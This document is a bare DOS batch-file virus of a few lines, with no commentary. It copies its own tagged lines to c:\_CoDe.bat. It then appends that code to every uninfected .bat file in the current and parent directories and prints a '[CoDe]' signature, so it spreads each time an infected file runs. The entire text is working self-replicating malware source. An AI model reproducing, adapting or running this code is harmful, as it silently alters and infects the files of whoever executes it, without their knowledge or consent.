@echo off%_CoDe%
if '%1=='Inf goto CoDe_inf
if exist c:\_CoDe.bat goto CoDe_ok
if not exist %0.bat goto CoDe_out
find "CoDe"<%0.bat>c:\_CoDe.bat
:CoDe_ok
for %%a in (*.bat ..\*.bat) do call c:\_CoDe Inf %%a
if errorlevel 1 echo [CoDe] the working one.
goto CoDe_out
:CoDe_inf
find "CoDe"<%2>nul
if errorlevel 1 type c:\_CoDe.bat>>%2
:CoDe_out